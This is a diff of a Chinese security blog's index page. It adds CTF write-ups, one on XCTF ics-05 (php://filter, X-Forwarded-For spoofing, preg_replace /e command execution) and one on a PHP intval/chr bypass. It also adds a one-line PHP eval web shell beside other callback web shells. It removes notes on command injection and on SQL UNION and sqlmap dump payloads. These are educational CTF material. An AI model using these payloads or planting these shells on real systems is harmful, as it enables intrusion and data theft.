@@ -146,6 +146,322 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-XCTF-ics-05-WriteUP" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/27/XCTF-ics-05-WriteUP/">XCTF ics-05 WriteUP ——php://filter </a>
+    </h1>
+  
+
+        
+        <a href="/2019/10/27/XCTF-ics-05-WriteUP/" class="archive-article-date">
+  	<time datetime="2019-10-27T12:03:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>进入题目<br><img src="https://i.loli.net/2019/10/27/fP9m3JFrYIHSy5R.png" alt="1.png"><br>打开题目后，点点左侧的菜单栏，或者扫一下后台，可以发现/index.php页面<br>尝试访问flag.php <code>Not Found</code> ,而index.php可以访问到，说明index.php存在</p>
+<p><img src="https://i.loli.net/2019/10/27/gWz7cLd6pTnI3f8.png" alt="2.png"><br>尝试使用php://filter读取index.php源码<br>构造php://filter/read=convert.base64-encode/resource=index.php<br><img src="https://i.loli.net/2019/10/27/SlW1CjuVgBPsyTG.png" alt="3.png"><br>Base64解码 进行简单的代码审计后 找到下面这段关键代码</p>
+<ol>
+<li>通过修改X-FORWARDED-FOR头 获得管理员权限</li>
+<li>PHP函数 preg_replace()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br><span class="line">参数说明：</span><br><span class="line">$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">$replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">$subject: 要搜索替换的目标字符串或字符串数组。</span><br><span class="line">$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span><br><span class="line">$count: 可选，为替换执行的次数。</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>preg_replace($pattern, $replacement, $subject);<br>即 在 subject 中匹配 pattern 的部分， 用 replacement 进行替换。</p>
+<p><img src="https://i.loli.net/2019/10/27/Od2CBIePuwVqyNL.png" alt="4.png"></p>
+<p>修改 X-FORWARDED-FOR： 127.0.0.1<br>获得权限<br><img src="https://i.loli.net/2019/10/27/vKFJPiy5nEt4g92.png" alt="5.png"><br>PHP 的 preg_replace()函数存在一个安全问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后)。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</span><br></pre></td></tr></table></figure></p>
+<p>构造 ?pat=/test/e&amp;rep=phpinfo()&amp;sub=test<br><img src="https://i.loli.net/2019/10/27/DUWmYNKJH6dx1gi.png" alt="6.png"><br>成功执行phpinfo()<br>然后构造 ?pat=/test/e&amp;rep=system(“ls”)&amp;sub=test<br>读取当前目录<br><img src="https://i.loli.net/2019/10/27/Y2tPbqWHoMugK1Z.png" alt="7.png"><br>发现可疑文件夹 s3chahahaDir<br>构造 ?pat=/test/e&amp;rep=system(“ls+s3chahahaDir”)&amp;sub=test<br><img src="https://i.loli.net/2019/10/27/wtC6KzdoX9Fkmjr.png" alt="8.png"><br>发现flag文件夹<br>构造 ?pat=/test/e&amp;rep=system(“ls+s3chahahaDir/flag”)&amp;sub=test<br><img src="https://i.loli.net/2019/10/27/SioTVrJNHkQq4vb.png" alt="9.png"><br>发现flag.php<br>构造 ?pat=/test/e&amp;rep=system(“cat+s3chahahaDir/flag/flag.php”)&amp;sub=test<br>读取flag.php<br><img src="https://i.loli.net/2019/10/27/Z5FyaTv7dSg1s4f.png" alt="10.png"><br>得到flag</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">WriteUP</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/10/27/XCTF-ics-05-WriteUP/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-BUUOJ-Warmup-HCTF2018-warmup-WriteUp" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/08/BUUOJ-Warmup-HCTF2018-warmup-WriteUp/">BUUOJ Warmup-HCTF2018 warmup WriteUp</a>
+    </h1>
+  
+
+        
+        <a href="/2019/10/08/BUUOJ-Warmup-HCTF2018-warmup-WriteUp/" class="archive-article-date">
+  	<time datetime="2019-10-08T13:54:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/10/08/BUUOJ-Warmup-HCTF2018-warmup-WriteUp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-PHP-intval和chr的利用" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/29/PHP-intval和chr的利用/">PHP intval和chr的利用</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/29/PHP-intval和chr的利用/" class="archive-article-date">
+  	<time datetime="2019-09-29T15:59:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[toc]</p>
+<h2><span id="题目">题目</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="string">'value'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">    <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'w3lc0me_To_xid1an'</span> &amp;&amp; intval($password) &lt; <span class="number">232</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">233</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<h2><span id="关键函数">关键函数</span></h2><ol>
+<li><p>chr()<br> 返回ascii值对应的字符</p>
+</li>
+<li><p>intval()<br>取整 </p>
+</li>
+</ol>
+<h2><span id="分析">分析</span></h2><p>首先大概分析一下题目，用get方式传入value喝password，对数组value中的每个字符进行判断，要求ascii码值大于32小于127，然后将value作为username，并将username与<code>&#39;w3lc0me_To_xid1an&#39;</code>进行比较，同时对password的值进行判断，要求<code>intval($password) &lt; 232 &amp;&amp; intval($password + 1) &gt; 233)</code>。</p>
+<hr>
+<h2><span id="解题">解题</span></h2><h3><span id="1">1.</span></h3><p>先构造一个数组<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Python</span></span><br><span class="line">str = <span class="string">'w3lc0me_To_xid1an'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">    print(ord(i) , <span class="string">" "</span>, end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p>
+<p>得到=&gt;119  51  108  99  48  109  101  95  84  111  95  120  105  100  49  97  110<br>但该值在32~127中，会被过滤<br>chr()返回字符时，会先对数值进行模256处理，可以对每个数值加上256，绕过<code>if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">'w3lc0me_To_xid1an'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">    print(ord(i) + <span class="number">256</span>, <span class="string">" "</span>, end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p>
+<p>得到=&gt;375  307  364  355  304  365  357  351  340  367  351  376  361  356  305  353  366</p>
+<p>构造</p>
+<blockquote>
+<p>value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=376&amp;value[12]=361&amp;value[13]=356&amp;value[14]=305&amp;value[15]=353&amp;value[16]=366</p>
+</blockquote>
+<h3><span id="2">2.</span></h3><p>利用intval()函数的特性 处理16进制字符串时<br><strong>intval(字符串)为0</strong><br>php ‘字符串’+1自动转换成数值<br>intval(数值)为数值取整<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$password=<span class="string">'0123'</span>;</span><br><span class="line"><span class="keyword">echo</span>(intval($password));</span><br><span class="line"><span class="comment"># 123</span></span><br><span class="line"></span><br><span class="line">$password=<span class="string">'0x123'</span>;</span><br><span class="line"><span class="keyword">echo</span>(intval($password));</span><br><span class="line"><span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">$password=<span class="string">'0x123'</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span>(intval($password));</span><br><span class="line"><span class="comment"># 292</span></span><br></pre></td></tr></table></figure></p>
+<p>绕过<code>if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</code></p>
+<p>PHP7中修复了该问题</p>
+<p>构造</p>
+<blockquote>
+<p>value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=376&amp;value[12]=361&amp;value[13]=356&amp;value[14]=305&amp;value[15]=353&amp;value[16]=366&amp;password=0x123<br>得到flag</p>
+</blockquote>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">WriteUp,PHP</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/29/PHP-intval和chr的利用/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-HCTF2018-Warmup-wp" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/25/HCTF2018-Warmup-wp/">HCTF2018 Warmup WriteUp</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/25/HCTF2018-Warmup-wp/" class="archive-article-date">
+  	<time datetime="2019-09-24T16:04:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/25/HCTF2018-Warmup-wp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-php奇技淫巧" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
@@ -166,7 +482,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p><a href="https://www.cnblogs.com/xishaonian/p/7628152.html" target="_blank" rel="noopener">CTF之PHP黑魔法总结</a><br><a href="https://blog.csdn.net/he_and/article/details/78461896" target="_blank" rel="noopener">ctf中php常见的考点</a></p>
+
       
 
       
@@ -179,7 +496,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">web php</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">web,php</a>
         		</li>
       		
 		</ul>
@@ -254,6 +571,7 @@
 <p>读取flag.php 可以使用连接字符串绕过或strtolower(‘PHP’)绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;script language=<span class="string">"PHP"</span>&gt;</span><br><span class="line"><span class="keyword">echo</span>((file_get_contents(<span class="string">'../flag.'</span>.<span class="string">'p'</span>.<span class="string">'h'</span>.<span class="string">'p'</span>)));</span><br><span class="line"> &lt;/script&gt;</span><br><span class="line"> <span class="comment">#查看页面源代码</span></span><br></pre></td></tr></table></figure></p>
 <p><a href="https://blog.csdn.net/yilovexing/article/details/52711673" target="_blank" rel="noopener">php读取文件的五种方式</a></p>
 <h2><span id="php一句话">php一句话</span></h2><p><code>&lt;?</code>被过滤可用 <code>&lt;script language=&quot;PHP&quot;&gt; echo(&quot;test&quot;)&lt;/script&gt;</code>绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@eval_r($_POST[pass])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">register_shutdown_function($e, $_REQUEST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var($_REQUEST[<span class="string">'pass'</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">'options'</span> =&gt; <span class="string">'assert'</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -622,349 +940,6 @@
 
 
   
-    <article id="post-Command-Injection" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/09/Command-Injection/">Command Injection </a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/09/Command-Injection/" class="archive-article-date">
-  	<time datetime="2019-08-09T01:35:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1><span id="命令注入">命令注入</span></h1><h2><span id="命令注入流程">命令注入流程</span></h2><ol>
-<li>是否调用系统命令</li>
-<li>函数的参数是否可控</li>
-<li>可控参数是否可控地拼接注入命令</li>
-</ol>
-<h2><span id="ampampamp-命令拼接符号的区别">&amp;，&amp;&amp;，| ，||命令拼接符号的区别</span></h2><p>A&amp;B：简单的拼接 A、B直接没有制约关系<br>A&amp;&amp;B：A执行成功才会执行B<br>A|B：A的输出，作为B的输入<br>A||B：A执行失败才会执行B</p>
-<h2><span id="无回显时">无回显时</span></h2><ol>
-<li>延时注入：</li>
-</ol>
-<table>
-<thead>
-<tr>
-<th>系统</th>
-<th>命令</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>windows</td>
-<td>ping 127.0.0.1 -n 5&gt;null</td>
-</tr>
-<tr>
-<td>linux</td>
-<td>sleep 5</td>
-</tr>
-</tbody>
-</table>
-<p>通过响应时间判断</p>
-<ol start="2">
-<li>远程请求</li>
-</ol>
-<table>
-<thead>
-<tr>
-<th>系统</th>
-<th>命令</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>windows</td>
-<td>ping,telnet等</td>
-</tr>
-<tr>
-<td>linux</td>
-<td>wget，curl等</td>
-</tr>
-</tbody>
-</table>
-<ol start="3">
-<li>dns查询</li>
-</ol>
-<h2><span id="fix">fix</span></h2><p>白名单<br>黑名单容易存在绕过 “”,’’</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/09/Command-Injection/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ByPassWAF思路" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/08/ByPassWAF思路/">ByPassWAF思路</a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/08/ByPassWAF思路/" class="archive-article-date">
-  	<time datetime="2019-08-08T03:15:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://www.secpulse.com/archives/109577.html" target="_blank" rel="noopener">【思路/技术】某大佬的BypassWAF新思路</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/08/ByPassWAF思路/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-sql注入" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/08/sql注入/">sql注入</a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/08/sql注入/" class="archive-article-date">
-  	<time datetime="2019-08-08T03:15:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://blog.csdn.net/wuqiongrj/article/details/51995016" target="_blank" rel="noopener">https://blog.csdn.net/wuqiongrj/article/details/51995016</a></p>
-<p>mysql 5.0版本以后提供了information.schema表，表中记录了数据库中所有的库、表、列等信息</p>
-<ol>
-<li><p>information.schema.schemata<br>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表</p>
-</li>
-<li><p>information.schema.tables<br>TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表.</p>
-</li>
-<li><p>information.schema.columns<br>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，注释等。是show columns from schemaname.tablename的结果取之此表.</p>
-</li>
-</ol>
-<p>找到注入点后，我们用order by语句查询数据库中存在多少数据表<br>确定多少个表，为了便于说明，假设有三个数据表，<br>    Order by 3 返回正常<br>    order by 4返回错误<br>然后使用and 1=2 union select 1，2，3 %23爆出可以回显敏感信息的位置,假设在2和3上</p>
-<p>下面我们就要查询敏感信息了，就要用到上面所说的系统函数了</p>
-<p>可以爆出当前使用版本和数据库名<br>and 1=2 union select 1,version(),database()</p>
-<p>爆出数据库名，依次使用limit2，1往下爆库名，也可以使用group_concat函数全部爆出来<br>and 1=2 union select 1,2,schema_name from information_schema.schemata limit 1,1 %23<br>and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata%23 。</p>
-<p>我们假设其中有flag库<br>and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where schema_name=’flag’ </p>
-<p>爆出flag库下的所有的表，假设其中有flagtable表<br>and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name =’flagtale’</p>
-<p>爆出flagtable下的所有字段，假设有name和password字段<br>and 1=2 union select 1,2,group_concat(name,password) from flag.flagtable爆出flag下的flagtable表的name和password的内容</p>
-<blockquote>
-<p>例:联合查询(手动)</p>
-<ol>
-<li>查询当前数据库中的所有表名：<br>1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#<br><img src="https://img-blog.csdnimg.cn/20190330233925194.png" alt=""></li>
-<li>查询表中的列名：<br>1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’secret_table’#<br><img src="https://img-blog.csdnimg.cn/20190330233947770.png" alt=""></li>
-<li>得到flag：<br>1’ union select 1,2,fl4g from news.secret_table#<br><img src="https://img-blog.csdnimg.cn/20190330233843352.png" alt=""></li>
-</ol>
-</blockquote>
-<blockquote>
-<p>例:(sqlmap)<br>1.sqlmap -r xctfrequest.txt –dbs<br><img src="https://img-blog.csdnimg.cn/20190613184610888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt=""><br>发现存在POST注入，继续深入<br>sqlmap -r xctfrequest.txt -D news –tables<br>sqlmap -r xctfrequest.txt -D news -T secret_table  –columns<br>sqlmap -r xctfrequest.txt -D news -T secret_table -C “id,fl4g” –dump<br>当然也可以一次性把new数据库内的内容全部爆出来，这样就不用一步步找flag在哪了，直接了当，所以对于有目的，好寻找的我们可以使用第一种步步深入；如果比较难找，就第二种方法比较好<br>sqlmap -r xctfrequest.txt -D news –dump<br><img src="https://img-blog.csdnimg.cn/20190613191841812.png" alt=""></p>
-</blockquote>
-<p>奇技淫巧</p>
-<ol>
-<li>上传文件名注入<br>利用上传文件名进行sql注入<br><img src="https://i.loli.net/2019/08/09/P47Cesx8OIEu2hQ.png" alt=""></li>
-</ol>
-<p><img src="https://i.loli.net/2019/08/09/g2KjkB987NpXShE.png" alt=""></p>
-<p><img src="https://i.loli.net/2019/08/09/XGFO2wA6YUcsrZg.png" alt=""></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/08/sql注入/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-2019安全态势" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/08/2019安全态势/">2019安全态势</a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/08/2019安全态势/" class="archive-article-date">
-  	<time datetime="2019-08-08T02:09:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://www.secpulse.com/archives/110146.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/110146.html</a></p>
-<h1><span id="网站安全态势">网站安全态势</span></h1><p>攻击量持续增加，信息泄漏问题依然严峻</p>
-<p>根据深信服全网安全态势感知平台对全球44501个IP2019年上半年所受网络攻击进行监测数据显示，网站攻击数量整体呈上升趋势，其中攻击类型以网站扫描、信息泄漏和弱口令攻击等类型为主。</p>
